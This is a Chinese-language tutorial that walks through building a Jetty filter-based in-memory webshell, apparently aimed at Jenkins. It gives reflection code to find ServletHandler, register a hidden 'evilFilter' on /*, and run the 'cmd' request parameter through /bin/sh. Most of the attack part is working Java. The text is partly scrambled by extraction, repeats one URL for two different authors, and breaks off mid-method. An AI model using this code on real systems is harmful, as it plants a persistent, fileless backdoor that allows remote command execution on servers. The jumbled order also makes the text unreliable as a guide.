1. 添加  到 ServletHandler#_filterNameMap 中
2. 调⽤ ServletHandler#prependFilterMapping 将添加到 _filterNameMappings 中的第⼀位
FilterMapping
然后来看到 FilterMapping 
这⾥我们主要关注我红框框出来的属性，通过结合上下⽂不难看出 _pathSpecs 为 urlpattern ，_filterName 为我
们的 filter 的名字，FilterHolder 应该就是我们 Filter 的封装类
也就是说我们要构造⼀个 FilterHolder 然后把它放到 FilterMapping 的 _holder 属性中，然后把对应的 filtername 
和 urlpattren 也放到 FilterMapping 的  _pathSpecs 和 _filterName 中
filtername 和 urlpattern 很好处理反射赋值就⾏了，所以并不是我们的重点关注对象，我们需要重点关注 
FilterHolder 
FilterHolder
来到 FilterHolder 发现是 Filter 的⼀个封装，发现构造函数传⼊的参数为 Filter 所以我们后⾯可以直接可以通过反
射获取构造器来进⾏实例化 
⼤致代码如下：
⾄此我们就是构造好了 FilterHolder 、FilterMapping 
所以 filter 的流程⼤致如下：
寻找 ServletHandler 对象
所以接下来的⽬标就是寻找 ServletHandler 对象，在可获取到 request & response 的情况下，遍历线程来获取通常
可作为起⼿式，接下来可配合 idea debug 进⾏寻找
对应属性对应的类都⾮常的清晰，这⾥我们的⽬标是寻找到 ServletHandler 对象
                Class filterHolderClas = _filters[0].getClass(); 
                Constructor filterHolderCons = 
filterHolderClas.getConstructor(javax.servlet.Filter.class);
                Object filterHolder = filterHolderCons.newInstance(shell);
ServletHandler#_filterPathMappings
-> FilterMapping#_holder 
--> FilterHolder
---> Filter
翻⼀下可在 request#_scope#_servletHander 中找到
所以最后的路径可找到 _servletHandler 
通过如下反射代码就可以获取到 ServletHandler 对象 
request#_scope
  request#_scope#_servletHandler 
....
Object _scope = JettyFilterMemShell.getField(shell.request,"_scope");
Object _servletHandler = JettyFilterMemShell.getField(_scope,"_servletHandler");
....
public static Object getField(Object obj, String fieldName) throws Exception {
  Field f0 = null;
  Class clas = obj.getClass();
  while (clas != Object.class){
    try {
      f0 = clas.getDeclaredField(fieldName);
      break;
    } catch (NoSuchFieldException e){
最终代码如下：
ps：由于内存马⾃⼰编写所以并没有测试多个版本，通⽤版本内存马可关注 su18 师傅 和 feihong师傅的项⽬
Su18师傅：https://github.com/feihong-cs/memShell
feihong师傅：https://github.com/feihong-cs/memShell
不过 Jenkins 这⾥的 jetty 内存马上⾯项⽬的⽅法会获取不到特定属性从⽽注⼊失败
      clas = clas.getSuperclass();
    }
  }
  if (f0 != null){
    f0.setAccessible(true);
    return f0.get(obj);
  }else {
    throw new NoSuchFieldException(fieldName);
  }
}
import javax.servlet.*;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.util.Map;
@SuppressWarnings("all")
public class JettyFilterMemShell implements Filter {
    Object request = null;
    Object response = null;
    boolean bool = false;
    String filterName = "evilFilter";
    String urlPattern = "/*";
    static {
        JettyFilterMemShell shell = new JettyFilterMemShell();
        try {
            shell.init();
            Object _scope = JettyFilterMemShell.getField(shell.request,"_scope");
            // 获取 ServletHandler 对象
            Object _servletHandler = 
JettyFilterMemShell.getField(_scope,"_servletHandler");
            Object[] _filters = (Object[]) 
JettyFilterMemShell.getField(_servletHandler,"_filters");
            // 判断 filter 是否已注⼊，如果已注⼊就不继续运⾏代码
            for (Object filter:_filters){
                String _name = (String) JettyFilterMemShell.getField(filter,"_name");
                if (_name.equals(shell.filterName)){
                    shell.bool = true;
                    break;
                }
            }
            if (!shell.bool){
                // 反射获取 FilterHolder 构造器并进⾏实例化
                Class filterHolderClas = _filters[0].getClass(); 
                Constructor filterHolderCons = 
filterHolderClas.getConstructor(javax.servlet.Filter.class);
                Object filterHolder = filterHolderCons.newInstance(shell); 了
                // 反射获取 FilterMapping 构造器并进⾏实例化
                Object[] _filtersMappings = (Object[]) 
JettyFilterMemShell.getField(_servletHandler,"_filterMappings");
                Class filterMappingClas = _filtersMappings[0].getClass(); 
                Constructor filterMappingCons = filterMappingClas.getConstructor();
                Object filterMapping = filterMappingCons.newInstance();
                // 反射赋值 filter 名
                Field _filterNameField = 
filterMappingClas.getDeclaredField("_filterName");
                _filterNameField.setAccessible(true);
                _filterNameField.set(filterMapping,shell.filterName);
                // 反射赋值 _holder
                Field _holderField = filterMappingClas.getDeclaredField("_holder");
                _holderField.setAccessible(true);
                _holderField.set(filterMapping,filterHolder);
                // 反射赋值 urlpattern
                Field _pathSpecsField = 
filterMappingClas.getDeclaredField("_pathSpecs");
                _pathSpecsField.setAccessible(true);
                _pathSpecsField.set(filterMapping,new String[]{shell.urlPattern});
                /**
                 * private final Map _filterNameMap = new 
HashMap();
                 *
                 *  at 
org.eclipse.jetty.servlet.ServletHandler.updateMappings(ServletHandler.java:1345)
                 *  at 
org.eclipse.jetty.servlet.ServletHandler.setFilterMappings(ServletHandler.java:1542)
                 *  at 
org.eclipse.jetty.servlet.ServletHandler.prependFilterMapping(ServletHandler.java:1242
)
                 */
                // 属性带有 final 需要先反射修改 modifiers 才能编辑 final 变量
                Field _filterNameMapField = 
_servletHandler.getClass().getDeclaredField("_filterNameMap");
                _filterNameMapField.setAccessible(true);
                Field modifiersField = 
Class.forName("java.lang.reflect.Field").getDeclaredField("modifiers");
                modifiersField.setAccessible(true);
 modifiersField.setInt(_filterNameMapField,_filterNameMapField.getModifiers()& 
~Modifier.FINAL);
                // 先把原来的取出来然后再放进去
                Map _filterNameMap = (Map) _filterNameMapField.get(_servletHandler);
                _filterNameMap.put(shell.filterName, filterHolder);
                _filterNameMapField.set(_servletHandler,_filterNameMap);
                // 调⽤ prependFilterMapping 将 mapping 放到第⼀个
                Method prependFilterMappingMethod = 
_servletHandler.getClass().getDeclaredMethod("prependFilterMapping",filterMappingClas)
;
                prependFilterMappingMethod.setAccessible(true);
                prependFilterMappingMethod.invoke(_servletHandler,filterMapping);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public void init() throws Exception{
        Class clazz = Thread.currentThread().getClass();
        Field field = clazz.getDeclaredField("threadLocals");
        field.setAccessible(true);
        Object object = field.get(Thread.currentThread());
        field = object.getClass().getDeclaredField("table");
        field.setAccessible(true);
        object = field.get(object);
        Object[] arrayOfObject = (Object[])object;
        for (byte b = 0; b < arrayOfObject.length; b++) {
            Object object1 = arrayOfObject[b];
            if (object1 != null) {
                field = object1.getClass().getDeclaredField("value");
                field.setAccessible(true);
                object = field.get(object1);
                if (object != null && 
object.getClass().getName().endsWith("HttpConnection")) {
                    Method method = 
object.getClass().getDeclaredMethod("getHttpChannel", null);
                    Object object2 = method.invoke(object, null);
                    method = object2.getClass().getMethod("getRequest", null);
                    this.request =  method.invoke(object2, null);
                    method = this.request.getClass().getMethod("getResponse", null);
                    this.response =  method.invoke(this.request, null);
                    break;
                }
            }
        }
    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }
    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse 
servletResponse, FilterChain filterChain) throws IOException, ServletException {
        String cmd = servletRequest.getParameter("cmd");
        if(cmd != null && !cmd.isEmpty()){
            String[] cmds = null;
            if(File.separator.equals("/")){
                cmds = new String[]{"/bin/sh", "-c", cmd};